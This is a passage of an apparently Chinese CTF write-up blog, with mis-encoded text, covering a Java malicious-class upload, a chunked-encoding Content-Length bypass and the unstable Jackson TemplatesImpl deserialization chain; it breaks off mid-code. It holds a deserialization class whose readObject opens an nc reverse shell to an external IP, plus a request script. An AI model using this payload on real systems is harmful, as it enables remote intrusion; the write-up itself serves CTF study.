<li><strong>å¼€å‘å·¥å…·å’Œæ„å»ºå·¥å…·çš„é…ç½®</strong>ï¼šè®¸å¤š Java é›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰å’Œæ„å»ºå·¥å…·ï¼ˆå¦‚ Maven å’Œ Gradleï¼‰ä½¿ç”¨ <code>JAVA_HOME</code> å˜é‡æ¥é…ç½®å…¶å†…éƒ¨ä½¿ç”¨çš„ Java ç¯å¢ƒã€‚è¿™æœ‰åŠ©äºç¡®ä¿é¡¹ç›®åœ¨æ­£ç¡®çš„ Java ç‰ˆæœ¬ä¸‹ç¼–è¯‘å’Œè¿è¡Œã€‚</li>
<li><strong>è·¨å¹³å°å…¼å®¹æ€§</strong>ï¼šé€šè¿‡ä½¿ç”¨ <code>JAVA_HOME</code> å˜é‡ï¼Œå¯ä»¥ä½¿ Java å¼€å‘ç¯å¢ƒåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šæ›´å…·å¯ç§»æ¤æ€§ã€‚å®ƒå…è®¸å¼€å‘äººå‘˜ç¼–å†™ä¸€æ¬¡ä»£ç ï¼Œç„¶ååœ¨ä¸åŒå¹³å°ä¸Šä½¿ç”¨ç›¸åŒçš„ <code>JAVA_HOME</code> å˜é‡æ¥è¿è¡Œä»£ç ã€‚</li>
</ol>
<p>æ€»ä¹‹ï¼Œ<code>JAVA_HOME</code> æ˜¯ä¸€ä¸ªå…³é”®çš„ç¯å¢ƒå˜é‡ï¼Œç”¨äºç¡®ä¿è®¡ç®—æœºä¸Šçš„ Java å¼€å‘å·¥å…·ã€åº”ç”¨ç¨‹åºå’Œè¿è¡Œæ—¶ç¯å¢ƒèƒ½å¤Ÿæ­£ç¡®åœ°æ‰¾åˆ°å’Œä½¿ç”¨ Java å®‰è£…ã€‚å®ƒåœ¨ Java å¼€å‘å’Œéƒ¨ç½²è¿‡ç¨‹ä¸­èµ·åˆ°é‡è¦ä½œç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤šç‰ˆæœ¬ Java å®‰è£…å’Œè·¨å¹³å°å¼€å‘çš„æƒ…å†µä¸‹ã€‚</p>
<p>ä¸è¯´äººè¯å°±æ˜¯è¿™æ ·,è¿™æ˜¯ä¼Ÿå¤§çš„ChatGPTè¯´çš„,ğŸ‘´ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯,è¿è¡Œè„šæœ¬çš„ä½ç½®åœ¨é‚£,è¦è¿è¡Œçš„classä¹Ÿåœ¨é‚£,æ‰€ä»¥æœ‰å•¥classæ”¾é‚£,ä»–å°±èƒ½åŠ è½½å•¥class.</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥è¦å¹²å•¥æ‡‚äº†æ²¡,ä¸Šä¼ ç‚¹å…·æœ‰æ”»å‡»æ€§çš„classåˆ°javahomeé‡Œé¢,ç‹ ç‹ åœ°å…¥å®ƒä¸€æ³¢.</p>
<p>è€Œä¸”ä¸æ˜¯æœ‰ååºåˆ—åŒ–å—,åˆ°è¿™ä½ ä¸å¯èƒ½è¿˜ä¸çŸ¥é“å§,åˆ›é€ ä¸€ä¸ªååºåˆ—åŒ–å¸¦æœ‰ç›´æ¥æ¶æ„æ“ä½œçš„ç±»,ç›´æ¥getshellğŸ˜Š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> InterruptedException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;nc&quot;</span>,<span class="string">&quot;43.143.192.19&quot;</span>,<span class="string">&quot;1145&quot;</span>,<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="keyword">if</span>(p.exitValue()!=<span class="number">0</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((s=reader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†™ä¸ªexpç±»,ç¼–è¯‘å¥½åå†ä¸Šä¼ ,åˆ«ç›´æ¥sbåˆ°æŠŠjavaä¸Šä¼ äº†</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102150011.png" alt="å¾®ä¿¡æˆªå›¾_20231102150011"></p>
<p>ä½†æ˜¯ğŸ‘´ä¸å¤ªé«˜å…´,å› ä¸ºæœ‰ç‚¹bug,ç¬¬ä¸€æ¬¡æ­dockeræ‰“ä¸æˆ,ç¬¬äºŒæ¬¡ç»ˆå‡ºäº†ğŸ˜’.</p>
<h1 id="DASCTFXCBCTF-2023-bypassJava"><a href="#DASCTFXCBCTF-2023-bypassJava" class="headerlink" title="DASCTFXCBCTF_2023_bypassJava"></a>DASCTFXCBCTF_2023_bypassJava</h1><p>çœŸtmæ¶å¿ƒçš„javaé¢˜,ä¸ä»…æœ‰ç»•è¿‡,è¿˜tmæœ‰RASPè¿™ç§æŠ½è±¡çš„ä¸œè¥¿,ğŸ‘´å¤ªå¼±äº†,ğŸ‘´è¦å­¦.</p>
<p>é¢˜ç›®ç¯å¢ƒç”šè‡³ä¸æ˜¯é¶æœº,è€Œæ˜¯é™æ€èµ„æº,å¾ˆä¸çˆ½.</p>
<p>è¿˜å¥½å‡ºé¢˜äººå¼€æºäº†:<a target="_blank" rel="noopener" href="https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava">pankass&#x2F;DASCTF_X_CBCTF2023_bypassJava: é¢˜ç›®æºç å’Œdockerç¯å¢ƒ (github.com)</a></p>
<h2 id="Content-Lengthé™åˆ¶"><a href="#Content-Lengthé™åˆ¶" class="headerlink" title="Content-Lengthé™åˆ¶"></a>Content-Lengthé™åˆ¶</h2><p>ä¸å¤šè¯´,ç¬¬ä¸€æ—¶é—´æƒ³åˆ°jacksoné“¾å­,ä½†æ˜¯æœ‰é•¿åº¦é™åˆ¶</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102154201.png" alt="å¾®ä¿¡æˆªå›¾_20231102154201"></p>
<p>è¿™é•¿åº¦é™åˆ¶æ˜¯äººèƒ½æƒ³å‡ºæ¥çš„å—ğŸ˜“,nmç¨å¾®å¤§ä¸€ç‚¹,éšä¾¿ä¸éƒ½å¾—å‡ åƒ?</p>
<p>è¿‡ä¸äº†,æ ¹æœ¬è¿‡ä¸äº†,è®©æˆ‘çœ‹çœ‹bypassæ€ä¹ˆä¸ªäº‹:<img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102155013.png" alt="å¾®ä¿¡æˆªå›¾_20231102155013"></p>
<p>è¿™é‡Œå¦‚æœå¤´éƒ¨æœ‰transfer-encoding,å°±ä¼šè¿›<code>addInputFilter</code></p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102160618.png" alt="å¾®ä¿¡æˆªå›¾_20231102160618"></p>
<p>è¿™é‡Œé¢å¦‚æœæœ‰chunked,é‚£ä¹ˆå°±ä¼šè®¾ç½®æˆ<code>this.contentDelimitation</code>ä¸ºtrue</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231102160810.png" alt="å¾®ä¿¡æˆªå›¾_20231102160810"></p>
<p>æœ€åè¿™é‡Œå°±ä¼šè¿›å…¥if,ä»è€Œè®¾ç½®ContentLengthä¸º-1,ç»•è¿‡é•¿åº¦é™åˆ¶.</p>
<h2 id="chunckedç¼–ç æ€ä¹ˆå‘"><a href="#chunckedç¼–ç æ€ä¹ˆå‘" class="headerlink" title="chunckedç¼–ç æ€ä¹ˆå‘"></a>chunckedç¼–ç æ€ä¹ˆå‘</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xuehaoyue/p/6639029.html">åˆ†å—ç¼–ç ï¼ˆTransfer-Encoding: chunkedï¼‰ - å¦™éŸ³å¤©å¥³ - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ç®€å•çœ‹ä¸€ä¸‹ä»¬å¤§æ¦‚å°±æ˜¯ </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åå…­è¿›åˆ¶é•¿åº¦/r/n</span><br><span class="line"> content/r/n</span><br><span class="line">  ....  </span><br><span class="line">    </span><br><span class="line"><span class="number">0</span>/r/n</span><br><span class="line"> /r/n</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸€å—éƒ½æ˜¯<code>åå…­è¿›åˆ¶è¡¨ç¤ºé•¿åº¦</code>ç„¶å,<code>/r/n</code></p>
<p>æ¥ç€è¾“å…¥content,ç„¶å<code>/r/n</code></p>
<p>æœ€åä¸€å—ä¸€å®šè¦è¾“å…¥<code>0/r/n/r/n</code></p>
<p>ğŸ‘´æµ…æµ…å†™ä¸ªè„šæœ¬</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/read&quot;</span></span><br><span class="line">content = open(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">leng = hex(len(content)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">body = leng+<span class="string">&quot;\r\n&quot;</span>+content+<span class="string">&quot;\r\n0\r\n\r\n&quot;</span></span><br><span class="line">print(body)</span><br><span class="line"></span><br><span class="line">headers= &#123;<span class="string">&quot;transfer-encoding&quot;</span>:<span class="string">&quot;chunked&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=body,headers=headers)</span><br></pre></td></tr></table></figure>



<p>soeasy,ğŸ¤£,</p>
<p>ç„¶è€Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥,ğŸ‘´ç°åœºç”šè‡³ç¬¬ä¸€æ­¥éƒ½æ²¡è¿‡å».</p>
<h2 id="å†…å­˜é©¬è¯»æ–‡ä»¶"><a href="#å†…å­˜é©¬è¯»æ–‡ä»¶" class="headerlink" title="å†…å­˜é©¬è¯»æ–‡ä»¶"></a>å†…å­˜é©¬è¯»æ–‡ä»¶</h2><h2 id="ä¸ç¨³å®šjacksoné“¾é—®é¢˜"><a href="#ä¸ç¨³å®šjacksoné“¾é—®é¢˜" class="headerlink" title="ä¸ç¨³å®šjacksoné“¾é—®é¢˜"></a>ä¸ç¨³å®šjacksoné“¾é—®é¢˜</h2><p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">å…³äºjavaååºåˆ—åŒ–ä¸­jacksoné“¾å­ä¸ç¨³å®šé—®é¢˜ (pankas.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12846">ä»JSON1é“¾ä¸­å­¦ä¹ å¤„ç†JACKSONé“¾çš„ä¸ç¨³å®šæ€§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p>ğŸ‘´ctmdæ‰“jacksoné“¾å­çš„æ—¶å€™,æœ‰å²ä»¥æ¥ç¬¬ä¸€æ¬¡é‡è§äº†é™Œç”Ÿçš„æŠ¥é”™</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[<span class="string">&quot;stylesheetDOM&quot;</span>])</span><br></pre></td></tr></table></figure>



<p>ä¸”ç»è¿‡æœ¬åœ°è°ƒè¯•,ä¼¼ä¹è¿›å…¥äº†é™Œç”Ÿçš„ä»£ç æ®µ,ğŸ‘´å¾ˆä¸ä¹æ„.</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231103150351.png" alt="å¾®ä¿¡æˆªå›¾_20231103150351"></p>
<p>å…·ä½“æ¥è¯´,å°±æ˜¯åœ¨è°ƒç”¨gettersçš„æ—¶å€™,ä¼˜å…ˆå¥äº†<code>getStylesheetDOM</code>è¿™ä¸ªæ–¹æ³•,ä½†æ˜¯,ä¼—æ‰€å‘¨çŸ¥,æˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™,æ˜¯ä¸ä¼šå»è®¾ç½®è¿™ä¸ªå€¼çš„,æ‰€ä»¥ç†æ‰€åº”å½“çš„,nmdç©ºæŒ‡é’ˆäº†.ğŸ˜“ğŸ˜…è€Œå½“å…¶è°ƒç”¨ getter æ–¹æ³•æ—¶ä¼˜å…ˆè°ƒç”¨ <code>getOutputProperties</code> æ–¹æ³•æ—¶æ‰æ˜¯æˆ‘ä»¬æ­£å¸¸æƒ³è¦çš„ç»“æœã€‚</p>
<p>è¿™nmçœŸæœ‰å‘å•Š,æ¯”èµ›æƒ³æ‰“è¿™æ¡é“¾å­,ä¸è¯´banä½é—®é¢˜,nmdè¿™é—®é¢˜ä¹Ÿåªèƒ½é€šè¿‡ä¸åœåœ°é‡ç½®é¶æœºè§£å†³äº†,æ¯”èµ›ä½ é‡ç½®é¶æœº,é™æ€åœ°å€ç­‰ä¼¼å§.</p>
<p>ç°åœ¨ğŸ‘´æ¥åˆ†æä¸€ä¸‹æ€ä¹ˆä¸ªäº‹,ä¼˜åŒ–ä¸€ä¸‹</p>
<h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p>è¿™æ¡é“¾å­åˆ†æğŸ‘´ä¸æƒ³è¯´äº†,é—­ç€çœ¼ç›éƒ½çŸ¥é“æ€ä¹ˆä¸ªäº‹.</p>
<p>å…³é”®æ˜¯è§¦å‘<code>POJONode</code>çš„<code>toString</code>æ–¹æ³•,ç„¶åå†…éƒ¨ç»è¿‡ä¸€ç³»åˆ—åºåˆ—åŒ–å™¨è°ƒç”¨ <code>POJONode</code> ä¸­å°çš„ <code>_value</code> å±æ€§çš„ getter æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨ <code>TemplatesImpl</code>ç±»å‹å¯¹è±¡çš„ <code>getOutputProperties</code> æ–¹æ³•ä»è€Œå¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>é‡ç‚¹å°±æ˜¯ä»<code>toString</code>åˆ°<code>getters</code>çš„è°ƒç”¨è¿™ä¸€è¿‡ç¨‹</p>
<p>æ ˆè°ƒè¯•æ”¾åœ¨è¿™:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨ <code>com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField</code> æ–¹æ³•ä¸­åˆ©ç”¨åå°„æ¥æ‰§è¡Œå…¶ <code>getters</code> æ–¹æ³•</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231103152329.png" alt="å¾®ä¿¡æˆªå›¾_20231103152329"></p>
<p>è¿™æ¬¡å°±è°ƒç”¨äº†getoutputProperties,å¾ˆå¥½,ğŸ‘´å–œæ¬¢ğŸ¤ª</p>
<p>é‚£å°±å¾€å‰çœ‹çœ‹å“ªé‡Œè·å–äº†<code>getters</code></p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231103152702.png" alt="å¾®ä¿¡æˆªå›¾_20231103152702"></p>
<p>åœ¨<code>com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields</code>ä¸­,<code>prop</code>æ•°ç»„å­˜å‚¨äº†<code>getters</code>,é€šè¿‡å¾ªç¯éå†æ‰€æœ‰<code>getters</code>å¹¶è°ƒç”¨<code>serializeAsField</code></p>
<p>è¿½è¸ªä¸€ä¸‹è¿™ä¸ªå˜é‡,ä»<code>	_props</code>è·å¾—</p>
<p>æœ€ç»ˆåœ¨<code>com.fasterxml.jackson.databind.introspect</code>èµ‹å€¼</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">collectAll:<span class="number">418</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getJsonValueAccessor:<span class="number">270</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findJsonValueAccessor:<span class="number">258</span>, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findSerializerByAnnotations:<span class="number">391</span>, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createSerializer2:<span class="number">224</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">createSerializer:<span class="number">173</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createUntypedSerializer:<span class="number">1495</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">_createAndCacheUntypedSerializer:<span class="number">1443</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findValueSerializer:<span class="number">544</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findTypedValueSerializer:<span class="number">822</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231103220943.png" alt="å¾®ä¿¡æˆªå›¾_20231103220943"></p>
<p>è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡å†³å®š<code>getters</code>é¡ºåº</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231104081525.png" alt="å¾®ä¿¡æˆªå›¾_20231104081525"></p>
<p>éšåé€šè¿‡<code>getDeclaredMethods</code> è·å–æ–¹æ³•ï¼Œé‚£è¿™é‡Œè·å–æ–¹æ³•çš„é¡ºåºæ˜¯ä¸å›ºå®šçš„ã€‚</p>
<p>å¹¶ä¸”ï¼Œåœ¨<code>com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer</code>æ–¹æ³•é‡Œï¼Œä¼šå°†è·å–çš„æ–¹æ³•é¡ºåºè¿›è¡Œç¼“å­˜ï¼Œä¹‹å‰æåˆ°è¿‡äº†ï¼Œç¼“å­˜åä¼šè¿›å…¥å…¶å®ƒifã€‚</p>
<p>å› æ­¤ç¬¬ä¸€æ¬¡æ‰“ä¸é€šï¼Œä¹‹åä¹Ÿæ— æ³•æ‰“é€šäº†</p>
<h3 id="ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š"><a href="#ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š" class="headerlink" title="ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š"></a>ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š</h3><p>è·å–é¡ºåºæ˜¯æ ¹æ®åœ°å€çš„å¤§å°æ¥æ’åºçš„ï¼ŒæœŸé—´å­˜åœ¨å†…å­˜freeçš„åŠ¨ä½œï¼Œé‚£åœ°å€æ˜¯ä¸ä¼šä¸€ç›´çº¿æ€§å˜åŒ–çš„ï¼Œä¹‹æ‰€ä»¥ä¸æŒ‰ç…§å­—æ¯æ’åºï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†é€Ÿåº¦è€ƒè™‘ï¼Œæ ¹æ®åœ°å€æ’åºæ˜¯æœ€å¿«çš„ã€‚</p>
<p>æ˜¯åå°„ <code>getDeclaredMethods</code> è·å–åˆ°æ–¹æ³•çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ï¼Œæœ€ç»ˆå¯¼è‡´æ‰§è¡Œç›¸å…³getteræ–¹æ³•çš„é¡ºåºä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼Œå½“ <code>TemplatesImpl</code> çš„ <code>getStylesheetDOM</code> æ–¹æ³•å…ˆäº <code>getOutputProperties</code> æ–¹æ³•æ‰§è¡Œæ—¶å°±ä¼šå¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸ä»è€Œå¯¼è‡´è°ƒç”¨é“¾æŠ¥é”™ä¸­æ–­ï¼Œexpåˆ©ç”¨å¤±è´¥ã€‚</p>
<h3 id="è§£å†³æ–¹æ³•ğŸ˜Š"><a href="#è§£å†³æ–¹æ³•ğŸ˜Š" class="headerlink" title="è§£å†³æ–¹æ³•ğŸ˜Š"></a>è§£å†³æ–¹æ³•ğŸ˜Š</h3><p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code>è§£å†³é—®é¢˜</p>
<h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><p>ä¼—æ‰€å‘¨çŸ¥,javaæœ‰ä¸ªbç©æ„å«åš<code>åŠ¨æ€ä»£ç†</code>,å¾ˆnb,ğŸ‘´åªåœ¨ccä¸­ç”¨è¿‡,ä¸æ¸…æ¥š.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;TestInterface1.class, TestInterface2.class&#125;, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) &#123;</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span 